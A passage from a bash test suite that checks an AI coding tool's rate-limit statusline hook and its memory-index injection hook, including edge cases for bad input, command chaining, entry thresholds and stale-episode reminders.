  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":25,"resets_at":9999999999},"seven_day":{"used_percentage":10,"resets_at":9999999999}}}' "$rl_home"
  if [[ -f "$rl_home/rate-limits.json" ]] && python3 -c "import json; d=json.load(open('$rl_home/rate-limits.json')); assert d['five_hour']['used_percentage']==25; assert d['seven_day']['used_percentage']==10; assert 'updated_at' in d"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — file: %s\n' "$name" "$(cat "$rl_home/rate-limits.json" 2>/dev/null || echo MISSING)"
  fi
  rm -rf "$rl_home"
}

rl_hook_missing_rate_limits() {
  # Verifies that a payload without a rate_limits key exits 0 and does not
  # create rate-limits.json (no partial write on irrelevant payloads).
  # Steps:
  #   1. Run the hook with JSON that has no rate_limits key
  #   2. Assert exit 0 and rate-limits.json does not exist
  local name="rl-hook/missing-rate-limits-no-write" rl_home status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  printf '%s' '{"other_key":"value"}' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s file_exists=%s\n' "$name" "$status" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_malformed_json() {
  # Verifies that malformed JSON input exits 0 and does not create rate-limits.json
  # (hook must not crash or produce partial output on bad input).
  # Steps:
  #   1. Run the hook with a non-JSON payload string
  #   2. Assert exit 0 and rate-limits.json does not exist
  local name="rl-hook/malformed-json-exits-0" rl_home status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  printf '%s' 'not-json{{{' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s\n' "$name" "$status"
  fi
  rm -rf "$rl_home"
}

rl_hook_chain_called() {
  # Verifies that when statusline-chain.conf holds a bare executable path,
  # the hook invokes it and still writes rate-limits.json.
  # Steps:
  #   1. Write a chain script that creates a sentinel file on invocation
  #   2. Write the script path to statusline-chain.conf
  #   3. Run the hook with a valid rate_limits payload
  #   4. Assert rate-limits.json exists and the sentinel file was created
  local name="rl-hook/chain-called" rl_home chain_log chain_script
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_log="$rl_home/chain-called"
  chain_script="$rl_home/chain.sh"
  cat > "$chain_script" <<'CHAINEOF'
#!/usr/bin/env bash
touch "$(dirname "$0")/chain-called"
CHAINEOF
  chmod +x "$chain_script"
  printf '%s\n' "$chain_script" > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  if [[ -f "$rl_home/rate-limits.json" && -f "$chain_log" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — rate-limits.json=%s chain-called=%s\n' "$name" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)" "$(test -f "$chain_log" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_chain_called_with_args() {
  # Verifies that a statusline-chain.conf entry that is a command string with
  # unquoted arguments is correctly invoked via bash -c and writes rate-limits.json.
  # Steps:
  #   1. Write a chain script that accepts arguments and creates a sentinel file
  #   2. Write "$script --some-arg" to statusline-chain.conf
  #   3. Run the hook with a valid rate_limits payload
  #   4. Assert rate-limits.json exists and the sentinel file was created
  local name="rl-hook/chain-called-with-args" rl_home chain_log chain_script
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_log="$rl_home/chain-called"
  chain_script="$rl_home/chain.sh"
  cat > "$chain_script" <<'CHAINEOF'
#!/usr/bin/env bash
touch "$(dirname "$0")/chain-called"
CHAINEOF
  chmod +x "$chain_script"
  # Store command string with arguments (not a bare path).
  printf '%s\n' "$chain_script --some-arg" > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  if [[ -f "$rl_home/rate-limits.json" && -f "$chain_log" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — rate-limits.json=%s chain-called=%s\n' "$name" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)" "$(test -f "$chain_log" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_chain_called_bash_c() {
  # Verifies that a statusline-chain.conf entry using bash -c shell syntax is
  # correctly executed and rate-limits.json is still written.
  # Steps:
  #   1. Write a bash -c '...' command string to statusline-chain.conf
  #   2. Run the hook with a valid rate_limits payload
  #   3. Assert rate-limits.json exists and the sentinel file was created by bash -c
  local name="rl-hook/chain-called-bash-c" rl_home chain_log
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_log="$rl_home/chain-called"
  # bash -c style command string — the form that read -r -a would break.
  printf '%s\n' "bash -c 'touch \"$chain_log\"'" > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  if [[ -f "$rl_home/rate-limits.json" && -f "$chain_log" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — rate-limits.json=%s chain-called=%s\n' "$name" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)" "$(test -f "$chain_log" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_empty_stdin() {
  # Verifies that empty stdin exits 0 without creating rate-limits.json
  # (guards against spurious writes when Claude Code sends a no-payload event).
  # Steps:
  #   1. Run the hook with empty stdin (printf '')
  #   2. Assert exit 0 and rate-limits.json does not exist
  local name="rl-hook/empty-stdin-exits-0" rl_home status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  printf '' | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  if [[ "$status" == "0" && ! -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s file_exists=%s\n' "$name" "$status" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_write_failure_chains() {
  # Verifies that a rate-limits.json write failure (unwritable CLAUDE_CONFIG_DIR)
  # does not prevent the configured chain command from being invoked; the hook
  # must still exit 0 so the chained StatusLine command is not silently dropped.
  # Steps:
  #   1. Create a temp dir; add statusline-chain.conf pointing to a chain script
  #   2. Make the dir read-only so rate-limits.json cannot be written
  #   3. Run the hook with a valid rate_limits payload
  #   4. Assert exit 0, chain sentinel exists, rate-limits.json absent
  local name="rl-hook/write-failure-chains" rl_home chain_dir chain_script chain_log status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  chain_dir="$(mktemp -d)"
  chain_script="$chain_dir/chain.sh"
  chain_log="$chain_dir/chain-called"
  cat > "$chain_script" <<'CHAINEOF'
#!/usr/bin/env bash
touch "$(dirname "$0")/chain-called"
CHAINEOF
  chmod +x "$chain_script"
  printf '%s\n' "$chain_script" > "$rl_home/statusline-chain.conf"
  chmod 555 "$rl_home"
  printf '%s' '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' \
    | CLAUDE_CONFIG_DIR="$rl_home" "$RL_HOOK" 2>/dev/null
  status=$?
  chmod 755 "$rl_home"
  if [[ "$status" == "0" && -f "$chain_log" && ! -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s chain-called=%s rate-limits.json=%s\n' \
      "$name" "$status" \
      "$(test -f "$chain_log" && echo yes || echo no)" \
      "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)"
  fi
  rm -rf "$rl_home" "$chain_dir"
}

rl_hook_chain_failure_isolated() {
  # Verifies that a failing chain command (non-zero exit) does not prevent
  # rate-limits.json from being written (|| true isolates chain failure).
  # Steps:
  #   1. Write "exit 1" as the chain command in statusline-chain.conf
  #   2. Run the hook with a valid rate_limits payload
  #   3. Assert hook exits 0 and rate-limits.json was written despite chain failure
  local name="rl-hook/chain-failure-isolated" rl_home status
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
  printf '%s\n' "exit 1" > "$rl_home/statusline-chain.conf"
  run_rl_hook '{"rate_limits":{"five_hour":{"used_percentage":50,"resets_at":9999999999}}}' "$rl_home"
  status=$?
  if [[ "$status" == "0" && -f "$rl_home/rate-limits.json" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s rate-limits.json=%s\n' "$name" "$status" "$(test -f "$rl_home/rate-limits.json" && echo yes || echo no)"
  fi
  rm -rf "$rl_home"
}

rl_hook_happy_path
rl_hook_missing_rate_limits
rl_hook_malformed_json
rl_hook_empty_stdin
rl_hook_chain_called
rl_hook_chain_called_with_args
rl_hook_chain_called_bash_c
rl_hook_write_failure_chains
rl_hook_chain_failure_isolated

# =============================================================================
# hook-inject-memory
# =============================================================================

echo
$LIST || echo "== hook-inject-memory =="

inject_encoded_path() {
  local path="$1"
  path="${path#/}"
  printf -- '-%s' "${path//\//-}"
}

write_inject_memory() {
  local config_dir="$1" cwd="$2" content="$3" encoded
  encoded="$(inject_encoded_path "$cwd")"
  mkdir -p "$config_dir/projects/$encoded/memory"
  printf '%s' "$content" > "$config_dir/projects/$encoded/memory/MEMORY.md"
}

inject_hook_happy_path() {
  # Verifies MEMORY.md index lines are injected when cwd matches a project exactly.
  # Steps:
  #   1. Create a sandbox project MEMORY.md with two "- " index lines
  #   2. Run the hook with a UserPromptSubmit payload whose cwd matches the project
  #   3. Assert stdout contains only the index lines wrapped in delimiters
  local name="inject-hook/happy-path" dir cwd payload output expected status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'# title\n- alpha\n  - nested ignored\n- beta\nnot index\n'
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  expected=$'=== auto-memory: MEMORY.md index ===\n- alpha\n- beta\n=== end auto-memory ==='
  if [[ "$status" == "0" && "$output" == "$expected" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_parent_fallback() {
  # Verifies ancestor project fallback is used when cwd has no direct MEMORY.md.
  # Steps:
  #   1. Create MEMORY.md for a parent project directory only
  #   2. Run the hook with cwd set to a nested child directory
  #   3. Assert stdout injects the parent project index line
  local name="inject-hook/parent-fallback" dir parent child payload output expected status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  parent="$dir/repo"
  child="$parent/packages/app"
  mkdir -p "$child"
  write_inject_memory "$dir" "$parent" $'# memory\n- parent index\n'
  payload="{\"cwd\":\"$child\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  expected=$'=== auto-memory: MEMORY.md index ===\n- parent index\n=== end auto-memory ==='
  if [[ "$status" == "0" && "$output" == "$expected" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_no_memory_found() {
  # Verifies missing MEMORY.md in cwd and ancestors exits 0 with empty stdout.
  # Steps:
  #   1. Create a sandbox config with no project memory files
  #   2. Run the hook with a valid cwd payload
  #   3. Assert exit 0 and empty stdout
  local name="inject-hook/no-memory-found" dir cwd payload output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/no-memory/subdir"
  mkdir -p "$cwd"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_empty_index() {
  # Verifies MEMORY.md without "- " index lines exits 0 with empty stdout.
  # Steps:
  #   1. Create a matching project MEMORY.md with no top-level index bullets
  #   2. Run the hook with a valid cwd payload
  #   3. Assert exit 0 and empty stdout
  local name="inject-hook/empty-index" dir cwd payload output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'# title\nnot an index\n  - nested ignored\n'
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_malformed_payload() {
  # Verifies malformed JSON stdin never crashes or blocks the prompt.
  # Steps:
  #   1. Create a sandbox config directory
  #   2. Run the hook with non-JSON stdin
  #   3. Assert exit 0 and empty stdout
  local name="inject-hook/malformed-payload" dir output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  output=$(printf '%s' 'not-json{{{' | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_empty_stdin() {
  # Verifies empty stdin exits 0 without stdout.
  # Steps:
  #   1. Create a sandbox config directory
  #   2. Run the hook with empty stdin
  #   3. Assert exit 0 and empty stdout
  local name="inject-hook/empty-stdin" dir output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  output=$(printf '' | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_missing_cwd() {
  # Verifies that a valid JSON payload with no "cwd" key exits 0 with empty
  # stdout — the cwd validation guard handles absent keys gracefully.
  # Steps:
  #   1. Run the hook with valid JSON payload containing no cwd field
  #   2. Assert exit 0 and empty stdout (hook silently skips)
  local name="inject-hook/missing-cwd" dir output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  output=$(printf '%s' '{}' | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_non_string_cwd() {
  # Verifies that a valid JSON payload with a non-string "cwd" value (e.g. a
  # number) exits 0 with empty stdout — the isinstance check rejects it.
  # Steps:
  #   1. Run the hook with valid JSON payload where cwd is an integer (123)
  #   2. Assert exit 0 and empty stdout (hook silently skips)
  local name="inject-hook/non-string-cwd" dir output status
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  output=$(printf '%s' '{"cwd":123}' | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_threshold_shows_directive() {
  # Verifies that when MEMORY.md has >= 50 index entries, the hook injects
  # ALL entries without truncation and appends a "run /memory-compress" directive.
  # Steps:
  #   1. Create a matching project MEMORY.md with 60 index lines (> threshold of 50)
  #   2. Run the hook with a valid cwd payload and capture stdout
  #   3. Assert all 60 lines appear (no truncation), delimiters present,
  #      and a "⚠ MEMORY.md has N entries" directive appears before closing delimiter
  local name="inject-hook/threshold-shows-directive" dir cwd payload output body status i directive_line
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  {
    printf '# title\n'
    for i in $(seq 1 60); do
      printf -- '- memory index line %03d\n' "$i"
    done
  } > "$dir/long-memory.md"
  write_inject_memory "$dir" "$cwd" "$(cat "$dir/long-memory.md")"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  body="$(printf '%s\n' "$output" | sed '1d;$d')"
  directive_line="$(printf '%s\n' "$body" | grep '^⚠' || true)"
  if [[ "$status" == "0" \
      && "$output" == ===\ auto-memory:\ MEMORY.md\ index\ ===$'\n'* \
      && "$output" == *$'\n'===\ end\ auto-memory\ === \
      && "$body" == *"memory index line 001"* \
      && "$body" == *"memory index line 060"* \
      && -n "$directive_line" \
      && "$directive_line" == *"run /memory-compress"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s directive=%q output_tail=%q\n' "$name" "$status" "$directive_line" "${output: -80}"
  fi
  rm -rf "$dir"
}

inject_hook_threshold_below_emits_no_directive() {
  # Verifies that exactly 49 index entries (one below the threshold of 50) does
  # NOT emit the /memory-compress directive — threshold is exclusive at 49.
  # Steps:
  #   1. Create a matching project MEMORY.md with exactly 49 index lines
  #   2. Run the hook and capture stdout
  #   3. Assert all 49 lines present, no "⚠" directive line in output
  local name="inject-hook/threshold-49-no-directive" dir cwd payload output body status i directive_line
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  {
    printf '# title\n'
    for i in $(seq 1 49); do
      printf -- '- memory index line %03d\n' "$i"
    done
  } > "$dir/memory49.md"
  write_inject_memory "$dir" "$cwd" "$(cat "$dir/memory49.md")"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  body="$(printf '%s\n' "$output" | sed '1d;$d')"
  directive_line="$(printf '%s\n' "$body" | grep '^⚠' || true)"
  if [[ "$status" == "0" \
      && "$body" == *"memory index line 049"* \
      && -z "$directive_line" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s directive=%q\n' "$name" "$status" "$directive_line"
  fi
  rm -rf "$dir"
}

inject_hook_threshold_at_boundary_emits_directive() {
  # Verifies that exactly 50 index entries (at the threshold) DOES emit the
  # /memory-compress directive — threshold fires at >= 50.
  # Steps:
  #   1. Create a matching project MEMORY.md with exactly 50 index lines
  #   2. Run the hook and capture stdout
  #   3. Assert all 50 lines present AND the "⚠" directive line appears
  local name="inject-hook/threshold-50-emits-directive" dir cwd payload output body status i directive_line
  should_run "$name" || return 0
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  {
    printf '# title\n'
    for i in $(seq 1 50); do
      printf -- '- memory index line %03d\n' "$i"
    done
  } > "$dir/memory50.md"
  write_inject_memory "$dir" "$cwd" "$(cat "$dir/memory50.md")"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  body="$(printf '%s\n' "$output" | sed '1d;$d')"
  directive_line="$(printf '%s\n' "$body" | grep '^⚠' || true)"
  if [[ "$status" == "0" \
      && "$body" == *"memory index line 050"* \
      && -n "$directive_line" \
      && "$directive_line" == *"run /memory-compress"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s directive=%q\n' "$name" "$status" "$directive_line"
  fi
  rm -rf "$dir"
}

inject_hook_default_home_fallback() {
  # Verifies that when CLAUDE_CONFIG_DIR is unset, the hook falls back to $HOME/.claude.
  # Steps:
  #   1. Create a temp dir used as a sandboxed HOME; write MEMORY.md under
  #      <tmp_home>/.claude/projects/<encoded>/memory/ with a uniquely-named fake cwd
  #   2. Run hook-inject-memory.sh with HOME overridden to the temp dir and
  #      CLAUDE_CONFIG_DIR stripped (env -u), so the fallback resolves to tmp_home
  #   3. Assert exit 0 and the index line appears in stdout
  #   4. Clean up the temp HOME — never touches real $HOME
  local name="inject-hook/default-home-fallback" cwd encoded tmp_home project_dir payload output status
  should_run "$name" || return 0
  tmp_home="$(mktemp -d)"
  cwd="/tmp/inject-hook-home-fallback-test-$$"
  encoded="$(inject_encoded_path "$cwd")"
  project_dir="${tmp_home}/.claude/projects/${encoded}/memory"
  mkdir -p "$project_dir"
  printf '# test\n- home fallback line\n' > "$project_dir/MEMORY.md"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | HOME="$tmp_home" env -u CLAUDE_CONFIG_DIR "$MEM_HOOK" 2>/dev/null)
  status=$?
  rm -rf "$tmp_home"
  if [[ "$status" == "0" && "$output" == *"home fallback line"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}

inject_hook_happy_path
inject_hook_parent_fallback
inject_hook_no_memory_found
inject_hook_empty_index
inject_hook_malformed_payload
inject_hook_empty_stdin
inject_hook_missing_cwd
inject_hook_non_string_cwd
inject_hook_threshold_below_emits_no_directive
inject_hook_threshold_at_boundary_emits_directive
inject_hook_threshold_shows_directive
inject_hook_default_home_fallback

# Episode reminder tests (CC-019 inject hook extension)

write_episodes_jsonl() {
  local config_dir="$1" cwd="$2" content="$3" encoded
  encoded="$(inject_encoded_path "$cwd")"
  mkdir -p "$config_dir/projects/$encoded/memory"
  printf '%s' "$content" > "$config_dir/projects/$encoded/memory/episodes.jsonl"
}

inject_hook_episode_no_file() {
  # Verifies that when episodes.jsonl does not exist, no reminder is appended.
  # Steps:
  #   1. Create project MEMORY.md but no episodes.jsonl
  #   2. Run inject hook and capture output
  #   3. Assert output contains index lines but no episode reminder
  local name="inject-hook/episode-no-file"
  should_run "$name" || return 0
  local dir cwd payload output status
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && "$output" == *"alpha"* && "$output" != *"💡"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_episode_fresh() {
  # Verifies that a recent episode (< 24h) does not trigger a reminder.
  # Steps:
  #   1. Create project MEMORY.md and episodes.jsonl with a now-dated entry
  #   2. Run inject hook
  #   3. Assert no 💡 reminder in output
  local name="inject-hook/episode-fresh"
  should_run "$name" || return 0
  local dir cwd payload output status now_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  now_iso="$(python3 -c 'from datetime import datetime,timezone; print(datetime.now(timezone.utc).isoformat())')"
  write_episodes_jsonl "$dir" "$cwd" "{\"date\":\"$now_iso\",\"cwd\":\"$cwd\",\"session_id\":\"s1\",\"summary\":\"\"}"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && "$output" == *"alpha"* && "$output" != *"💡"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_episode_stale_no_summary() {
  # Verifies stale episode (> 24h) with no summary triggers /mem-log reminder.
  # Steps:
  #   1. Create episodes.jsonl with an entry dated 48h ago, empty summary
  #   2. Run inject hook
  #   3. Assert output contains 💡 ... /mem-log reminder
  local name="inject-hook/episode-stale-no-summary"
  should_run "$name" || return 0
  local dir cwd payload output status old_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  old_iso="$(python3 -c 'from datetime import datetime,timezone,timedelta; print((datetime.now(timezone.utc)-timedelta(hours=48)).isoformat())')"
  write_episodes_jsonl "$dir" "$cwd" "{\"date\":\"$old_iso\",\"cwd\":\"$cwd\",\"session_id\":\"s1\",\"summary\":\"\"}"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && "$output" == *"/mem-log"* && "$output" == *"💡"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_episode_stale_has_summary() {
  # Verifies stale episode (> 24h) with a summary triggers "Last episode" reminder.
  # Steps:
  #   1. Create episodes.jsonl with a 48h-old entry that has a non-empty summary
  #   2. Run inject hook
  #   3. Assert output contains 💡 Last episode reminder (not /mem-log reminder)
  local name="inject-hook/episode-stale-has-summary"
  should_run "$name" || return 0
  local dir cwd payload output status old_iso
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  old_iso="$(python3 -c 'from datetime import datetime,timezone,timedelta; print((datetime.now(timezone.utc)-timedelta(hours=48)).isoformat())')"
  write_episodes_jsonl "$dir" "$cwd" "{\"date\":\"$old_iso\",\"cwd\":\"$cwd\",\"session_id\":\"s1\",\"summary\":\"Previous session summary.\"}"
  payload="{\"cwd\":\"$cwd\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$MEM_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && "$output" == *"Last episode"* && "$output" == *"💡"* && "$output" != *"/mem-log to record"* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
